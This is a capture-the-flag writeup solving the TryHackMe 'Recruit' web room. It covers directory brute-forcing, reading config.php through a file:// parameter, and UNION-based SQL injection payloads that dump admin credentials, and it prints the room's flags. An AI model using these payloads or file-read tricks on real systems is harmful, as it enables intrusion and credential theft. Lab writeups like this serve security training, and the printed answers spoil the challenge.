# [TryHackMe | Recruit](https://tryhackme.com/room/recruitwebchallenge) Challenge Room Solution Writeup

### What is the flag value after logging in as a normal user?

Use `gobuster` to map out the directory structure of the target website. 

```bash
gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -r -x html,php,txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 1417]
/header.php           (Status: 200) [Size: 457]
/mail                 (Status: 200) [Size: 934]
/assets               (Status: 200) [Size: 2656]
/footer.php           (Status: 200) [Size: 289]
/file.php             (Status: 200) [Size: 20]
/api.php              (Status: 200) [Size: 4151]
/javascript           (Status: 403) [Size: 277]
/logout.php           (Status: 200) [Size: 1417]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 200) [Size: 1417]
/phpmyadmin           (Status: 200) [Size: 14773]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 277]
Progress: 5095332 / 5095336 (100.00%)
===============================================================
Finished
===============================================================
```

Following `http://TARGET_IP/mail/mail.log` reveals `username=hr` and that the password is stored in `config.php`:

```
May 14 09:32:11 recruit-server postfix/smtpd[2143]: connect from hr-workstation.local[10.10.5.23]
May 14 09:32:12 recruit-server postfix/smtpd[2143]: 4F1A2203F: client=hr-workstation.local[10.10.5.23]
May 14 09:32:13 recruit-server postfix/cleanup[2146]: 4F1A2203F: message-id=<20240514093213.4F1A2203F@recruit.local>
May 14 09:32:13 recruit-server postfix/qmgr[1789]: 4F1A2203F: from=<hr@recruit.thm>, size=1824, nrcpt=1 (queue active)
May 14 09:32:14 recruit-server postfix/local[2151]: 4F1A2203F: to=<it-support@recruit.local>, relay=local, delay=0.34, status=sent

------------------------------------------------------------
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
------------------------------------------------------------

May 14 09:32:14 recruit-server postfix/qmgr[1789]: 4F1A2203F: removed
```

`http://TARGET_IP/api.php` provides instructions to retrieve files like `config.php`. `http://TARGET_IP/file.php?cv=file:///var/www/html/config.php` reveals `password=hrpassword123`:

```php
<?php

/*
|--------------------------------------------------------------------------
| Application Configuration
|--------------------------------------------------------------------------
*/

$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$APP_DEBUG       = false;

/*
|--------------------------------------------------------------------------
| HR Credentials (Temporary – Initial Rollout Phase)
|--------------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = 'hrpassword123';

/*
|--------------------------------------------------------------------------
| API Configuration
|--------------------------------------------------------------------------
*/

$API_ENABLED     = true;
$API_VERSION     = 'v1';


?>
```

Use `username=hr` and `password=hrpassword123` to login via `http://TARGET_IP/index.php`. Upon logging in successfully, you will get see the flag **THM{LOGGED_IN_USER}**.

### What is the flag value after logging in as admin?

Test whether SQL injection is possible for the Candidate Applications table and proceed accordingly. 

- Insert a `'` into the search bar and search to see if SQL injection is an available attack vector. Doing so returns `SQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 `, which indicates that SQL injection is possible. 
- Enumerate through the number of columns until you get to `' UNION SELECT 1,2,3,database() -- -`, which works and reveals `recruit_db`. 
- Use `' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'recruit_db' -- -` to reveal `candidates,users`. 
- Use `' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' -- -` to reveal `CURRENT_CONNECTIONS,MAX_SESSION_CONTROLLED_MEMORY,MAX_SESSION_TOTAL_MEMORY,TOTAL_CONNECTIONS,USER,id,password,username`. 
- Use `' UNION SELECT 1,2,3,group_concat(username,':',password SEPARATOR '<br>') FROM users -- -` to reveal `admin:admin@001admin`. 

Log out then use `username=admin` and `password=admin@001admin` to login via `http://TARGET_IP/index.php`. Upon logging in successfully, you will get see the flag **THM{LOGGED_IN_ADMIN1}**.